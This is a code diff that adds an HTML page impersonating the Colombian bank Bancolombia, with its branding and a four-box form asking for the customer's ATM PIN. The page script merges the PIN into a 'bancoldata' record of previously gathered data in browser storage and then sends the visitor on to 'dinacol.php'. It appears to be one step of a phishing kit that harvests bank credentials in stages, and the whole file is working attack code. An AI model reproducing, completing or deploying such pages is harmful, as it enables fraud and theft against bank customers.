@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bancolombia - Clave</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Open Sans', Arial, sans-serif; }
+
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 250px; left: -50px;
+            width: 800px; height: 400px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M-10,80 Q30,20 80,60 T120,40" fill="none" stroke="%23F47C20" stroke-width="3" stroke-linecap="round"/><path d="M10,80 Q50,20 100,60" fill="none" stroke="%23FDDA24" stroke-width="2" stroke-linecap="round"/></svg>') no-repeat;
+            background-size: contain; z-index: 0;
+        }
+
+        body::after {
+            content: "";
+            position: absolute;
+            top: 150px; right: 0;
+            width: 400px; height: 600px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"><path d="M50,100 Q60,50 100,10" fill="none" stroke="%23FDDA24" stroke-width="4" stroke-linecap="round"/><path d="M20,100 Q50,60 90,20" fill="none" stroke="%23F47C20" stroke-width="2" stroke-linecap="round"/><path d="M70,40 Q85,20 100,15" fill="none" stroke="%238E44AD" stroke-width="2" stroke-linecap="round"/></svg>') no-repeat;
+            background-size: contain; z-index: 0;
+        }
+
+        /* ── HEADER ── */
+        header {
+            width: 100%; padding: 30px 0 20px 0;
+            text-align: center; position: relative; z-index: 10;
+        }
+        header img { width: 200px; }
+        .header-salir {
+            position: absolute; right: 24px; top: 50%;
+            transform: translateY(-50%);
+            font-size: 14px; font-weight: 600; color: #2C2A29;
+            cursor: pointer; background: none; border: none;
+        }
+
+        /* ── CONTENEDOR ── */
+        .container {
+            display: flex; flex-direction: column; align-items: center;
+            max-width: 500px; margin: 0 auto;
+            padding: 10px 20px 50px 20px;
+            position: relative; z-index: 5;
+        }
+
+        .page-title {
+            font-size: 1.8rem; color: #2C2A29;
+            font-weight: 800; margin-bottom: 20px; text-align: center;
+        }
+
+        /* ── CARD ── */
+        .login-card {
+            background: #fff; border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            padding: 40px 30px; width: 100%; text-align: center;
+        }
+
+        .login-card p.subtitle {
+            font-size: 0.95rem; color: #444;
+            line-height: 1.5; margin-bottom: 32px;
+        }
+
+        /* ── 4 CAJITAS DE DÍGITO ── */
+        .pin-row {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 12px;
+        }
+
+        .pin-input {
+            width: 54px; height: 62px;
+            text-align: center; font-size: 22px; font-weight: 700;
+            border: 1.5px solid #ccc; border-radius: 8px;
+            outline: none; color: #2C2A29;
+            font-family: 'Open Sans', Arial, sans-serif;
+            -webkit-appearance: none;
+            transition: border-color 0.2s;
+        }
+        .pin-input:focus { border-color: #2C2A29; }
+
+        .forgot-link {
+            display: block; text-align: right;
+            font-size: 0.8rem; font-weight: 700;
+            color: #2C2A29; text-decoration: underline;
+            margin-bottom: 28px; cursor: pointer;
+        }
+
+        /* ── BOTÓN ── */
+        .btn-submit {
+            width: 100%; background-color: #E0E0E0; color: #757575;
+            border: none; border-radius: 50px; padding: 16px;
+            font-size: 1rem; font-weight: 700;
+            margin-top: 4px; transition: all 0.3s; cursor: not-allowed;
+        }
+        .btn-submit.activo { background-color: #FDDA24; color: #2C2A29; cursor: pointer; }
+
+        /* ── LOADER ── */
+        #loading-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(255,255,255,0.95);
+            z-index: 9999; display: none;
+            justify-content: center; align-items: center; flex-direction: column;
+        }
+        .loader-container { position: relative; width: 60px; height: 60px; animation: rotateLoader 1.5s linear infinite; }
+        .dot { position: absolute; width: 20px; height: 20px; border-radius: 50%; }
+        .dot-yellow { background-color: #FDDA24; top: 0; left: 50%; transform: translateX(-50%); }
+        .dot-blue { background-color: #2C2A29; bottom: 5px; left: 0; }
+        .dot-red { background-color: #ccc; bottom: 5px; right: 0; }
+        @keyframes rotateLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        @media (max-width: 768px) {
+            body::before { top: 80px; left: -100px; width: 600px; height: 300px; opacity: 0.6; }
+            body::after { top: 100px; right: -80px; width: 350px; height: 500px; opacity: 0.6; }
+            .container { padding: 10px 15px; }
+            .page-title { font-size: 1.5rem; }
+            .login-card { padding: 30px 20px; }
+            .pin-input { width: 48px; height: 56px; font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+<div id="loading-overlay">
+    <div class="loader-container">
+        <div class="dot dot-yellow"></div>
+        <div class="dot dot-blue"></div>
+        <div class="dot dot-red"></div>
+    </div>
+    <div style="color:#2C2A29; margin-top:20px; font-weight:600;">Validando datos...</div>
+</div>
+
+<header>
+    <img src="img/logo.svg" alt="Bancolombia">
+    <button class="header-salir" onclick="history.back()">Salir →</button>
+</header>
+
+<div class="container">
+    <h1 class="page-title">Ingresa tu clave</h1>
+    <div class="login-card">
+        <p class="subtitle">Ingresa tu clave del cajero para continuar.</p>
+
+        <div class="pin-row">
+            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" id="p1">
+            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" id="p2">
+            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" id="p3">
+            <input type="password" class="pin-input" maxlength="1" inputmode="numeric" id="p4">
+        </div>
+
+        <a class="forgot-link" href="#">¿Olvidaste o bloqueaste tu clave?</a>
+
+        <button id="btnContinuar" class="btn-submit">Continuar</button>
+    </div>
+</div>
+
+<script>
+    var inputs = document.querySelectorAll('.pin-input');
+    var btn = document.getElementById('btnContinuar');
+
+    inputs.forEach(function(input, i) {
+        input.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value && i < inputs.length - 1) inputs[i + 1].focus();
+            var allFilled = Array.from(inputs).every(function(inp) { return inp.value !== ''; });
+            btn.classList.toggle('activo', allFilled);
+        });
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && !this.value && i > 0) inputs[i - 1].focus();
+        });
+    });
+
+    btn.addEventListener('click', function() {
+        var clave = Array.from(inputs).map(function(i) { return i.value; }).join('');
+        if (clave.length < 4) return;
+        document.getElementById('loading-overlay').style.display = 'flex';
+        var d = {};
+        try { d = JSON.parse(localStorage.getItem('bancoldata')) || {}; } catch(e) {}
+        d.clave = clave;
+        localStorage.setItem('bancoldata', JSON.stringify(d));
+        setTimeout(function() { window.location.href = 'dinacol.php'; }, 800);
+    });
+</script>
+</body>
+</html>
